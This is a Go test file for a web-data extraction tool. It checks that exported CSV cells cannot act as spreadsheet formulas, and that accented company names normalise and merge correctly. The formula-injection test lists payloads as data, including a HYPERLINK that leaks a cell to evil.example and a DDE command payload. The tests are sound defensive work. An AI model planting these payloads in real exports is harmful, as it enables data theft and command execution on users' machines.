package dataset_test

import (
	"bytes"
	"encoding/csv"
	"strings"
	"testing"

	"github.com/lajosdeme/mole/internal/dataset"
)

// Regression tests for the M9 review.
//
// Both cases were found by probing rather than by reading, and both are mine: a
// CSV that a spreadsheet executes, and an accent table whose two halves had
// silently drifted apart.

// TestACellCannotBecomeAFormula.
//
// Excel, LibreOffice and Google Sheets evaluate a cell whose first character is
// =, +, - or @. mole extracts from arbitrary web pages into a file somebody opens
// in a spreadsheet, so this is the whole of that threat model — and every payload
// below reached the output untouched before the fix.
func TestACellCannotBecomeAFormula(t *testing.T) {
	s, err := dataset.ParseSpec("company:text!")
	if err != nil {
		t.Fatal(err)
	}
	payloads := []string{
		`=1+1`,
		`=HYPERLINK("http://evil.example?x="&A1,"click")`,
		`+1+1`,
		`-1+1`,
		`@SUM(A1:A9)`,
		`=cmd|' /C calc'!A0`,
	}
	var rows []dataset.Merged
	for _, p := range payloads {
		rows = append(rows, dataset.Merged{
			Cells: map[string]dataset.Cell{"company": {Text: p}},
		})
	}

	var buf bytes.Buffer
	d := dataset.Dataset{Schema: s, Rows: rows}
	if err := d.WriteCSV(&buf, false); err != nil {
		t.Fatal(err)
	}
	recs, err := csv.NewReader(&buf).ReadAll()
	if err != nil {
		t.Fatalf("not valid CSV: %v", err)
	}
	for i, rec := range recs[1:] {
		cell := rec[0]
		if cell == "" {
			t.Fatalf("row %d is empty", i)
		}
		if strings.ContainsRune("=+-@", rune(cell[0])) {
			t.Errorf("a spreadsheet would evaluate %q", cell)
		}
		// Defused, not destroyed: the value is still readable.
		if !strings.Contains(cell, strings.TrimPrefix(payloads[i], "=")) {
			t.Errorf("the value was mangled rather than defused: %q from %q",
				cell, payloads[i])
		}
	}
}

// TestAnOrdinaryValueIsNotPrefixed. The mitigation must not touch values that
// were never a formula, or every negative number in the dataset grows an
// apostrophe.
func TestAnOrdinaryValueIsNotPrefixed(t *testing.T) {
	s, _ := dataset.ParseSpec("company:text!,revenue:number")
	d := dataset.Dataset{Schema: s, Rows: []dataset.Merged{{
		Cells: map[string]dataset.Cell{
			"company": {Text: "Acme Ltd"},
			"revenue": {Text: "1200000"},
		},
	}}}
	var buf bytes.Buffer
	if err := d.WriteCSV(&buf, false); err != nil {
		t.Fatal(err)
	}
	recs, _ := csv.NewReader(&buf).ReadAll()
	if recs[1][0] != "Acme Ltd" || recs[1][1] != "1200000" {
		t.Errorf("an ordinary row was altered: %q", recs[1])
	}
}

// TestAccentsFoldToTheRightLetter.
//
// The table was two parallel strings, and they had drifted: 75 runes against 79,
// so every letter past the drift mapped to the wrong base and "Łódź" normalised to
// "dodz". Two parallel sequences whose correspondence nothing checks is the
// construct that caused it.
//
// Asserted through Normalise rather than against a copy of the table, so a test
// holding its own stale copy cannot pass while the code is wrong — which is
// exactly what the probe that found this did on the first run after the fix.
func TestAccentsFoldToTheRightLetter(t *testing.T) {
	for _, tc := range []struct{ in, want string }{
		{"Nestlé", "nestle"},
		{"Müller", "muller"},
		{"Škoda", "skoda"},
		{"Citroën", "citroen"},
		{"Åkerman", "akerman"},
		{"Łódź", "lodz"},
		{"Ćevapi", "cevapi"},
		{"Žofia", "zofia"},
		{"Coöperatie", "cooperatie"},
		{"Ångström", "angstrom"},
		{"Šiauliai", "siauliai"},
		{"Ærø", "aro"},
		{"Straße", "strase"},
		{"Danone", "danone"},
	} {
		if got := dataset.Normalise(tc.in); got != tc.want {
			t.Errorf("Normalise(%q) = %q, want %q", tc.in, got, tc.want)
		}
	}
}

// TestAnAccentedNameMergesWithItsUnaccentedForm, which is the reason the table
// exists: a source that lost the accent must not become a second entity.
func TestAnAccentedNameMergesWithItsUnaccentedForm(t *testing.T) {
	s, _ := dataset.ParseSpec("company:text!,revenue:number")
	rows := []dataset.Row{
		{Values: map[string]string{"company": "Nestlé SA", "revenue": "1"},
			Source: "https://a.example"},
		{Values: map[string]string{"company": "Nestle S.A.", "revenue": "1"},
			Source: "https://b.example"},
		{Values: map[string]string{"company": "Łódź Holdings", "revenue": "2"},
			Source: "https://c.example"},
		{Values: map[string]string{"company": "Lodz Holdings", "revenue": "2"},
			Source: "https://d.example"},
	}
	d := dataset.Merge(s, rows, dataset.Options{})
	if len(d.Rows) != 2 {
		var got []string
		for _, r := range d.Rows {
			got = append(got, r.Get("company"))
		}
		t.Fatalf("rows = %d, want 2 — an accent split an entity: %v", len(d.Rows), got)
	}
}
